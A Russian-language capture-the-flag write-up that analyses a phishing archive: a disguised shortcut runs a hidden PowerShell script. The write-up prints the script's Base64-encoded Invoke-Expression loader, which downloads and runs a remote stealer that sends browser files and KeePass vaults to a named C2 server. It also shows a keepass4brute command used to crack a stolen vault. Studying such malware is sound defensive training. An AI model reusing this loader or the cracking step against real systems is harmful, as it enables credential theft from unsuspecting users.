## How Much Is The Phish
На почту нашей службе безопасности пришло письмо от HR, внутри которого был вот такой архив.
Пользователь сказал, что резюме открылось не совсем обычно, а с некой задержкой.
Посмотри, с чем это может быть связано...

---
На старте нам дан архив CV.zip
Распакуем его и видим странный файл:

<img width="676" alt="image" src="https://github.com/user-attachments/assets/1e8ce36b-0201-4d76-a5ef-809ac4e77256" />


Видим, что на самом деле это не .docx файл, а ярлык.

Проанализируем содержимое этого ярлыка:

<img width="545" alt="image" src="https://github.com/user-attachments/assets/e062c502-1a93-463f-b769-37b32376472f" />


Ярлык запускает файл updater.ps1, но мы этот файл не видим в директории. Почему? Он скрыт.

Включаем видимость скрытых файлов, теперь наша директория выглядит так:

<img width="577" alt="image" src="https://github.com/user-attachments/assets/8a4a8439-3279-41d6-93e1-f0a4a50613b0" />


Изучим содержимое скрипта updater.ps1:

<img width="931" alt="image" src="https://github.com/user-attachments/assets/eaf743dc-f5b9-4bf4-b4ec-2ae245d29ea9" />


Скрип содержит закодированную команду:
```
$EncodedText = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHMAdAAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGUAcgBlAHAAYQB3AHcAawBhAC8AZAA2ADMAMgAzADcAOQBmADEAMQAwAGQAOQA0AGMAMAAwADkAMgA3ADAAYwBmAGUAYwA2AGIANQBlADIANgBjAC8AcgBhAHcALwBhAGIAOAAzAGMAYwA4ADgANAA5ADMAZQAwADcAYwA0ADEAZgA1ADAAYwA1AGYAYQBiADAANgBkAGUAOQBhAGQAMgA3AGQAMgAzADAAYQA2AC8AYwBoAGUAYwBrAF8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA"
```
Эта команда декодируется и исполняется при помощи Invoke-Expression (IEX).
Раскодируем её:

<img width="1005" alt="image" src="https://github.com/user-attachments/assets/571e9db7-7850-459a-9224-7d7242e7e988" />


Получаем ссылку, с которой скачивается полезная нагрузка, и затем исполняется:
https://gist.githubusercontent.com/cherepawwka/d632379f110d94c009270cfec6b5e26c/raw/ab83cc88493e07c41f50c5fab06de9ad27d230a6/check_update.ps1

Анализируем скрипт:

<img width="525" alt="image" src="https://github.com/user-attachments/assets/b78103f0-e48d-4715-af11-df03153189a3" />


В первой части скрипта осуществляется сборка домена, давайте же узнаем доменное имя C2-домена:

<img width="420" alt="image" src="https://github.com/user-attachments/assets/f3c66930-a417-4016-a681-51354e193917" />


Получаем следующее:
```
PS C:\Windows\system32> echo $domain
microsoft-update.org
PS C:\Windows\system32> echo $prefix
check-connection.
PS C:\Windows\system32> echo $url
http://check-connection.microsoft-update.org:31337
```
Ответом на первое задание будет флаг (формат: `flag{http://domain:port}`):
```
flag{http://check-connection.microsoft-update.org:31337}
```

Проанализировав остальное содержимое скрипта, понимаем, что он предназначен для кражи пользовательских данных: файлов браузера и файлов .kdbx (хранилища KeePass).
Указанные файлы отправляются на C2-сервер. Давайте перехватим трафик и поёмем, что происходит под капотом.
Из скрипта мы знаем, что IP-адрес C2-сервера: 51.250.113.206.
Настроим захват пакетов на этот сервер:

<img width="365" alt="image" src="https://github.com/user-attachments/assets/92625bc2-4e6c-4d13-8786-0099f6f3a93f" />


И запустим захват трафика.
В изолированной среде осуществляем запуск скрипта (важно, запуск должен осуществляться от имени администратора):

После чего начинаем анализировать содержимое трафика.
В трафике находим интересный запрос, который, как видно из скрипта, осуществляет проверку доступности C2-сервера:

<img width="672" alt="image" src="https://github.com/user-attachments/assets/26231afd-9c95-4021-aee8-0831ab20a61b" />


Здесь же получаем первую часть флага:
```
flag{1_w4n7_y0u_b4ck
```

Теперь проверим, что было далее. Видим, что на эндпоинт http://check-connection.microsoft-update.org:31337/collection осуществляется отправка содержимого в Base64:

<img width="366" alt="image" src="https://github.com/user-attachments/assets/65fd1b86-5b41-4526-8fb9-e4440a1551cf" />


*Для тестирования я создал тестовый текстовый файл test.kdbx, чтобы скрипт стиллера отработал корректно.*
В результате успешной отправки нашего псевдофайла .kdbx сервер отдал нам следующий ответ, попутно раскрыв одну из директорий:

<img width="683" alt="image" src="https://github.com/user-attachments/assets/2739f913-91ca-448d-b8d0-2b5af23dcdce" />

Перейдем на этот URL:
http://51.250.113.206:31337/archives_513426d0-854a-44db-9abc-b8c24c70786b

<img width="690" alt="image" src="https://github.com/user-attachments/assets/5febcce5-765a-436f-b1d4-96b388de7ea2" />

Видим несколько архивов и инфомрационный файл.
Один архив загружен нами, а один, с индексом 0, скорее всего был украден в ходе компрометации жертвы.
Скачаем его по пути http://51.250.113.206:31337/archives_513426d0-854a-44db-9abc-b8c24c70786b/archive_0.zip:

<img width="372" alt="image" src="https://github.com/user-attachments/assets/12f7146a-0b81-43fb-a10e-1e418cd778b6" />

Внутри находится файл с расширением .kdbx:

<img width="441" alt="image" src="https://github.com/user-attachments/assets/d16e2d3f-a794-4d72-8612-890572f61c3d" />

Он запаролен, и нам нужно его взломать.
Для этого скачаем его вновь, только в этот раз на Kali:

<img width="906" alt="image" src="https://github.com/user-attachments/assets/1b0049d4-8c65-4bb2-9cdc-7d28fbfa4661" />

Для брута будем использовать этот скрипт:
https://github.com/r3nt0n/keepass4brute
Запускаем его:
```
/opt/keepass4brute/keepass4brute.sh Database_Victim.kdbx /usr/share/wordlists/rockyou.txt
```
<img width="817" alt="image" src="https://github.com/user-attachments/assets/339b276d-4562-4029-8ad7-c03de21c85bf" />


Подбираем пароль: `scooter`
Идём и забираем флаг:

<img width="485" alt="image" src="https://github.com/user-attachments/assets/df9c315c-d937-4662-8fc3-bd3b6f9a54c0" />

Полный флаг:
```
flag{1_w4n7_y0u_b4ck_f0r_7h3_ph151ng_4774ck}
```
